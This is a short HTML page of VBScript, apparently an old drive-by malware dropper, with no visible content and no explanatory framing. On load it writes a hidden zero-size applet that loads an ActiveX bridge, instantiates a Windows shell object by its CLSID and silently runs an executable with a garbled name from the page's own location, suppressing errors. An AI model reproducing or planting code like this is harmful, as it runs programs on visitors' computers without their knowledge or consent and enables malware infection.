<body><html>
<body >
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><APPLET NAME=LHW HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET></div>"
</script>
<script language=vbscript>
On Error Resume Next
Dim we,path,win
we = ""
Path = ""
win=""
Path = Left(document.location, Len(document.location) - 11)
Path = Mid(Path, 9)
Set AppleObject = document.applets("lhw")
AppleObject.setCLSID ("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}")
AppleObject.createInstance()
Set WsShell = AppleObject.GetObject()
Wsshell.run(Path + "������.exe")
</script>
</body>
</html>
</body>